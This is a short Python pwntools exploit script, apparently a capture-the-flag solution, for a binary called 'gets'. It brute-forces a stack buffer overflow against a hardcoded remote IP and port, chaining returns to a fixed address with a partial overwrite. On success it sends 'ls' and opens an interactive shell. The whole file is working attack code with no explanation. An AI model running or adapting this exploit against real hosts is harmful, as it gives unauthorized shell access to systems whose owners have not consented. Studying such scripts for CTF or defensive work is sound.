from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath

elf = ELF(elfpath)
bits = elf.bits


def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + '\x16\02'
            p.sendline(payload)

            p.sendline('ls')
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue


if __name__ == "__main__":
    exp('106.75.4.189', 35273)
